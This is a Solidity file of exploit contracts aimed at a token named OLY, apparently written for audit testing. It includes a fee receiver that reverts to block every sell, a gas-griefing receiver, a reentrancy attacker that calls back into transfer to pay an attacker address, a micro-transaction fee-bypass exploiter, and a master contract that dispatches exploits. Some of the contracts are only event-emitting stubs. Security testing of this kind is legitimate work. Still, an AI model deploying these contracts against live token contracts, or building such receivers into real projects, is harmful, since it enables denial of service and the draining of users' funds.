// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title OLY Security Exploit Contracts
 * @dev Collection of contracts used for demonstrating vulnerabilities in OLY token
 * ⚠️ FOR SECURITY RESEARCH AND TESTING PURPOSES ONLY
 * 
 * These contracts are designed to exploit specific vulnerabilities in the OLY token
 * contract for educational and security audit purposes. DO NOT USE ON MAINNET.
 */

// Interface for OLY token contract
interface IOLY {
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function mint(address to, uint256 amount) external;
    function hasRole(bytes32 role, address account) external view returns (bool);
}

/**
 * @title MaliciousFeeReceiver
 * @dev Demonstrates DoS attack by reverting on fee receiver calls
 * CVE-OLY-003: Complete Protocol DoS via External Call
 */
contract MaliciousFeeReceiver {
    bool public attackEnabled = true;
    uint256 public callCount = 0;
    
    event AttackTriggered(uint256 count);
    
    /**
     * @dev This function will always revert when called, blocking all sell transactions
     */
    function triggerSwapFeeForLottery() external {
        callCount++;
        emit AttackTriggered(callCount);
        
        if (attackEnabled) {
            revert("DoS Attack: All sell transactions blocked!");
        }
    }
    
    /**
     * @dev Alternative attack: consume excessive gas
     */
    function triggerSwapFeeForLotteryGasAttack() external {
        callCount++;
        
        // Consume excessive gas to make transactions expensive
        for (uint256 i = 0; i < 1000000; i++) {
            keccak256(abi.encode(i, block.timestamp, msg.sender));
        }
    }
    
    /**
     * @dev For demonstration: can be disabled to show normal operation
     */
    function disableAttack() external {
        attackEnabled = false;
    }
    
    function enableAttack() external {
        attackEnabled = true;
    }
}

/**
 * @title GasGriefingReceiver  
 * @dev Demonstrates gas griefing attack on fee receiver calls
 * CVE-OLY-007: Gas Limit Exploitation DoS
 */
contract GasGriefingReceiver {
    uint256 public gasConsumptionLevel = 100000;
    uint256 public callCount = 0;
    
    event GasGriefingAttack(uint256 gasUsed, uint256 callCount);
    
    function triggerSwapFeeForLottery() external {
        callCount++;
        uint256 startGas = gasleft();
        
        // Consume excessive gas based on consumption level
        for (uint256 i = 0; i < gasConsumptionLevel; i++) {
            keccak256(abi.encode(i, block.timestamp, msg.sender, callCount));
        }
        
        uint256 gasUsed = startGas - gasleft();
        emit GasGriefingAttack(gasUsed, callCount);
    }
    
    function setGasConsumptionLevel(uint256 _level) external {
        gasConsumptionLevel = _level;
    }
}

/**
 * @title ReentrancyAttacker
 * @dev Demonstrates reentrancy attacks during fee collection
 * CVE-OLY-004: Reentrancy Vulnerability in Transfer Function
 */
contract ReentrancyAttacker {
    IOLY public olyContract;
    address public attacker;
    address public reentrancyTarget;
    uint256 public reentrancyAmount;
    bool public attackEnabled;
    uint256 public maxAttacks = 1;
    uint256 public attackCount;
    uint256 public lastAttackAmount;
    
    event AttackExecuted(uint256 count, uint256 amount);
    event ReentrancyAttempt(address target, uint256 amount);
    
    function setOLYContract(address _oly) external {
        olyContract = IOLY(_oly);
    }
    
    function setAttacker(address _attacker) external {
        attacker = _attacker;
    }
    
    function setReentrancyTarget(address _target) external {
        reentrancyTarget = _target;
    }
    
    function setReentrancyAmount(uint256 _amount) external {
        reentrancyAmount = _amount;
    }
    
    function enableAttack() external {
        attackEnabled = true;
    }
    
    function disableAttack() external {
        attackEnabled = false;
    }
    
    function setMaxAttacks(uint256 _max) external {
        maxAttacks = _max;
    }
    
    function resetAttack() external {
        attackCount = 0;
        lastAttackAmount = 0;
    }
    
    /**
     * @dev This function is called during fee collection and performs reentrancy
     */
    function triggerSwapFeeForLottery() external {
        if (!attackEnabled || attackCount >= maxAttacks) {
            return;
        }
        
        attackCount++;
        lastAttackAmount = reentrancyAmount;
        
        emit ReentrancyAttempt(reentrancyTarget, reentrancyAmount);
        
        // Reentrancy attack: call back into OLY contract during execution
        try olyContract.transfer(attacker, reentrancyAmount) {
            emit AttackExecuted(attackCount, reentrancyAmount);
        } catch {
            // Attack failed, but we tried
        }
    }
    
    /**
     * @dev Fallback to receive tokens
     */
    receive() external payable {}
}

/**
 * @title MockFeeReceiver
 * @dev Normal fee receiver for testing legitimate operations
 */
contract MockFeeReceiver {
    uint256 public callCount = 0;
    uint256 public totalFeesReceived = 0;
    
    event SwapTriggered(uint256 count);
    event FeesReceived(uint256 amount);
    
    function triggerSwapFeeForLottery() external {
        callCount++;
        emit SwapTriggered(callCount);
    }
    
    // Function to track fees received (if tokens are sent directly)
    function trackFees(uint256 amount) external {
        totalFeesReceived += amount;
        emit FeesReceived(amount);
    }
    
    function getStats() external view returns (uint256 calls, uint256 fees) {
        return (callCount, totalFeesReceived);
    }
}

/**
 * @title ArithmeticExploiter
 * @dev Contract to test arithmetic vulnerabilities
 * CVE-OLY-001: SafeMath Bypass Underflow
 * CVE-OLY-002: Direct Balance Manipulation
 */
contract ArithmeticExploiter {
    IOLY public olyContract;
    
    event UnderflowAttempt(uint256 amount, uint256 fee);
    event OverflowAttempt(uint256 balance, uint256 addition);
    
    function setOLYContract(address _oly) external {
        olyContract = IOLY(_oly);
    }
    
    /**
     * @dev Attempt to trigger underflow in fee calculation
     */
    function attemptUnderflow(uint256 amount, uint256 expectedFee) external {
        emit UnderflowAttempt(amount, expectedFee);
        
        // This would be called if we could manipulate the fee calculation
        // In practice, this demonstrates the vulnerability concept
    }
    
    /**
     * @dev Attempt to trigger overflow in balance addition
     */
    function attemptOverflow(uint256 currentBalance, uint256 addition) external {
        emit OverflowAttempt(currentBalance, addition);
        
        // This demonstrates the overflow vulnerability concept
        // In practice, the vulnerability is in the OLY contract's direct arithmetic
    }
}

/**
 * @title PrecisionExploiter
 * @dev Contract to demonstrate precision-based fee bypass
 * CVE-OLY-008: Precision-Based Fee Bypass
 */
contract PrecisionExploiter {
    IOLY public olyContract;
    address public mainPair;
    uint256 public microTransactionSize;
    uint256 public executedTransactions;
    
    event MicroTransactionExecuted(uint256 amount, uint256 count);
    event PrecisionBypassDetected(uint256 amount, uint256 expectedFee, uint256 actualFee);
    
    function setOLYContract(address _oly) external {
        olyContract = IOLY(_oly);
    }
    
    function setMainPair(address _mainPair) external {
        mainPair = _mainPair;
    }
    
    function setMicroTransactionSize(uint256 _size) external {
        microTransactionSize = _size;
    }
    
    /**
     * @dev Execute multiple micro-transactions to bypass fees
     */
    function executeMicroTransactions(uint256 count, address recipient) external {
        for (uint256 i = 0; i < count; i++) {
            try olyContract.transfer(recipient, microTransactionSize) {
                executedTransactions++;
                emit MicroTransactionExecuted(microTransactionSize, executedTransactions);
            } catch {
                // Transaction failed
                break;
            }
        }
    }
    
    /**
     * @dev Calculate and report precision bypass
     */
    function reportPrecisionBypass(uint256 amount, uint256 feeRatio, uint256 precision) external {
        uint256 expectedFee = (amount * feeRatio) / precision;
        
        if (expectedFee == 0 && amount > 0) {
            emit PrecisionBypassDetected(amount, 1, 0); // Expected at least 1 wei, got 0
        }
    }
}

/**
 * @title RoleExploiter
 * @dev Contract to demonstrate role-based exploits
 * CVE-OLY-005: INTERN_SYSTEM Role Complete Fee Bypass
 */
contract RoleExploiter {
    IOLY public olyContract;
    bytes32 public constant INTERN_SYSTEM_ROLE = keccak256("INTERN_SYSTEM");
    
    event RoleExploitAttempt(address account, bool hasRole);
    event FeeBypassDetected(uint256 amount, uint256 feesAvoided);
    
    function setOLYContract(address _oly) external {
        olyContract = IOLY(_oly);
    }
    
    /**
     * @dev Check if an account has INTERN_SYSTEM role
     */
    function checkInternSystemRole(address account) external {
        bool hasRole = olyContract.hasRole(INTERN_SYSTEM_ROLE, account);
        emit RoleExploitAttempt(account, hasRole);
    }
    
    /**
     * @dev Simulate fee bypass calculation
     */
    function simulateFeeBypass(uint256 transferAmount, uint256 feeRate) external {
        uint256 expectedFee = (transferAmount * feeRate) / 100000;
        emit FeeBypassDetected(transferAmount, expectedFee);
    }
}

/**
 * @title ComprehensiveExploiter
 * @dev Master contract that can execute multiple types of exploits
 */
contract ComprehensiveExploiter {
    IOLY public olyContract;
    address public owner;
    
    // Exploit tracking
    mapping(string => bool) public exploitExecuted;
    mapping(string => uint256) public exploitResults;
    
    event ExploitExecuted(string exploitType, bool success, uint256 result);
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }
    
    constructor() {
        owner = msg.sender;
    }
    
    function setOLYContract(address _oly) external onlyOwner {
        olyContract = IOLY(_oly);
    }
    
    /**
     * @dev Execute a specific exploit by name
     */
    function executeExploit(string memory exploitType, bytes memory data) external onlyOwner {
        bool success = false;
        uint256 result = 0;
        
        if (keccak256(bytes(exploitType)) == keccak256(bytes("precision_bypass"))) {
            (success, result) = _executePrecisionBypass(data);
        } else if (keccak256(bytes(exploitType)) == keccak256(bytes("role_bypass"))) {
            (success, result) = _executeRoleBypass(data);
        }
        // Add more exploit types as needed
        
        exploitExecuted[exploitType] = success;
        exploitResults[exploitType] = result;
        
        emit ExploitExecuted(exploitType, success, result);
    }
    
    function _executePrecisionBypass(bytes memory data) internal returns (bool, uint256) {
        // Decode parameters and execute precision bypass
        (uint256 microAmount, uint256 count) = abi.decode(data, (uint256, uint256));
        
        uint256 successfulTransactions = 0;
        for (uint256 i = 0; i < count; i++) {
            try olyContract.transfer(owner, microAmount) {
                successfulTransactions++;
            } catch {
                break;
            }
        }
        
        return (successfulTransactions > 0, successfulTransactions);
    }
    
    function _executeRoleBypass(bytes memory data) internal returns (bool, uint256) {
        // Decode parameters and check role bypass
        (address account) = abi.decode(data, (address));
        
        bytes32 internSystemRole = keccak256("INTERN_SYSTEM");
        bool hasRole = olyContract.hasRole(internSystemRole, account);
        
        return (hasRole, hasRole ? 1 : 0);
    }
    
    /**
     * @dev Get exploit results
     */
    function getExploitResult(string memory exploitType) external view returns (bool executed, uint256 result) {
        return (exploitExecuted[exploitType], exploitResults[exploitType]);
    }
}